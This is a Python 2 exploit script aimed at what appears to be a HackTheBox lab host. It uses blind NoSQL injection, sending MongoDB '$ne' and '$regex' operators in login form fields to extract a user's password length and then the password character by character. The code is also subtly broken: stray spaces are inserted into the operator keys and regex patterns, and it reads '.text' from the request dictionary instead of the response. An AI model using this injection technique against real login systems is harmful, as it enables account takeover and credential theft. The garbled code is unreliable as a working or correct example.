#! / usr / bin / env python2
# - * - coding: utf8 - * -
import requests

page = "http://staging-order.mango.htb"

SUCCESS_STRING = "Under Plantation"

size = 0
while 1:
    forge = ". {" + str(size) + "}"
    req = {'usr_name [$ ne]': 'hacker', 'usr_password [$ regex]': forge}
    result = requests.post(page, data=req)
    print(req)
    if not SUCCESS_STRING in req.text:
        break
    size += 1

size -= 1
print ("[+] The password is" + str (size) + "characters")
passwd = ""
char = 48

length = 0

while length != size:
    forge = passwd + str (chr (char )) + '. {' + str (size - len (passwd ) - 1 ) + '}' ;
    req = {'usr_name [$ ne]': 'hacker', 'usr_password [$ regex]': forge }
    result = requests.post(page, data= req)
    print(req)
    if SUCCESS_STRING in req.text:
        passwd += str(chr (char))
        char = 48
        length += 1
        print(passwd)

    if char == 90:
        char = 96
    if char == 57:
        char = 64
    char += 1

print("[+] The password is:" + str (passwd))
